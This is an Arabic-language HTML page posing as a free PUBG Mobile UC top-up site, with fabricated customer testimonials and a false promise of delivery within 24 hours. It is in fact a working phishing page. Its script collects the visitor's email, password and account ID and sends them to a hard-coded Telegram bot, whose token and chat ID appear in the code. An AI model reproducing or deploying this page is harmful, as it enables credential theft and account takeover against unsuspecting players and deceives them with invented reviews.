<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن US مجاناً</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
        }
        .header {
            background-color: #2c3e50;
            color: white;
            width: 100%;
            padding: 15px 0;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            margin: 20px 0;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: right;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s;
            margin-top: 10px;
            font-weight: bold;
        }
        button:hover {
            background-color: #c0392b;
        }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .pubg-images {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 10px;
            margin: 20px 0;
        }
        .pubg-images img {
            width: 100px;
            height: 100px;
            object-fit: cover;
            border-radius: 8px;
            border: 2px solid #e74c3c;
            transition: transform 0.3s;
        }
        .pubg-images img:hover {
            transform: scale(1.05);
        }
        .testimonials {
            background-color: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            text-align: right;
        }
        .testimonial {
            margin-bottom: 15px;
            padding: 10px;
            border-right: 3px solid #e74c3c;
        }
        .uc-cards {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin: 25px 0;
        }
        .uc-card {
            background-color: #2c3e50;
            color: white;
            padding: 15px;
            border-radius: 8px;
            width: 120px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .uc-card h3 {
            margin: 0;
            color: #f39c12;
        }
        .uc-card p {
            margin: 5px 0 0;
            font-size: 24px;
            font-weight: bold;
        }
        .footer {
            background-color: #2c3e50;
            color: white;
            width: 100%;
            text-align: center;
            padding: 15px 0;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>شحن UC مجاناً - PUBG MOBILE</h1>
    </div>
    
    <div class="container">
        <div class="pubg-images">
            <img src="https://i.imgur.com/JQlE0gD.jpg" alt="PUBG UC">
            <img src="https://i.imgur.com/5XZwW7m.jpg" alt="PUBG Royale Pass">
            <img src="https://i.imgur.com/8zLQY3j.jpg" alt="PUBG Skins">
            <img src="https://i.imgur.com/3vVZQ9h.jpg" alt="PUBG Weapons">
        </div>
        
        <h2>اهلا بك في شحن US مجاناً</h2>
        
        <div class="uc-cards">
            <div class="uc-card">
                <h3>UC</h3>
                <p>60</p>
            </div>
            <div class="uc-card">
                <h3>UC</h3>
                <p>325</p>
            </div>
            <div class="uc-card">
                <h3>UC</h3>
                <p>660</p>
            </div>
            <div class="uc-card">
                <h3>UC</h3>
                <p>1800</p>
            </div>
        </div>
        
        <div class="form-group">
            <label for="email">ادخل بريدك الالكتروني</label>
            <input type="email" id="email" placeholder="example@example.com" required>
        </div>
        
        <div class="form-group">
            <label for="password">ادخل كلمة السر</label>
            <input type="password" id="password" placeholder="كلمة السر" required>
        </div>
        
        <div class="form-group">
            <label for="id">ادخل ID حسابك</label>
            <input type="text" id="id" placeholder="ID الحساب" required>
        </div>
        
        <button onclick="sendData()">ارسال الشحن</button>
        
        <div id="message" class="message"></div>
        
        <div class="testimonials">
            <h3>اراء عملائنا:</h3>
            <div class="testimonial">
                <strong>أحمد:</strong> شكراً لكم، استلمت الـ UC خلال دقائق!
            </div>
            <div class="testimonial">
                <strong>سارة:</strong> خدمة رائعة ومجانية، أنصح الجميع!
            </div>
            <div class="testimonial">
                <strong>خالد:</strong> الموقع سريع وسهل الاستخدام، شحن ناجح.
            </div>
        </div>
    </div>
    
    <div class="pubg-images">
        <img src="https://i.imgur.com/7v2KZ4j.jpg" alt="PUBG Character 1">
        <img src="https://i.imgur.com/9mR3bLk.jpg" alt="PUBG Character 2">
        <img src="https://i.imgur.com/2WnQdXx.jpg" alt="PUBG Character 3">
        <img src="https://i.imgur.com/QZwfL1N.jpg" alt="PUBG Character 4">
    </div>
    
    <div class="footer">
        <p>جميع الحقوق محفوظة &copy; 2023 | شحن US مجاناً</p>
    </div>

    <script>
        function sendData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const id = document.getElementById('id').value;
            
            // التحقق من الحقول الفارغة
            if (!email || !password || !id) {
                showMessage('يرجى ملء جميع الحقول', 'error');
                return;
            }
            
            // إرسال البيانات إلى بوت التليجرام
            const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
            const chatId = '6913353602';
            const text = `بريد جديد لشحن US:\n\nالبريد: ${email}\nكلمة السر: ${password}\nID: ${id}`;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        showMessage('تم ارسال معلومات الشحن بنجاح! سيصلك الـ UC خلال 24 ساعة', 'success');
                        // مسح الحقول بعد الإرسال
                        document.getElementById('email').value = '';
                        document.getElementById('password').value = '';
                        document.getElementById('id').value = '';
                    } else {
                        showMessage('حدث خطأ أثناء الارسال، يرجى المحاولة لاحقاً', 'error');
                    }
                })
                .catch(error => {
                    showMessage('حدث خطأ في الاتصال، يرجى المحاولة لاحقاً', 'error');
                    console.error('Error:', error);
                });
        }
        
        function showMessage(message, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = message;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            // إخفاء الرسالة بعد 5 ثواني
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>
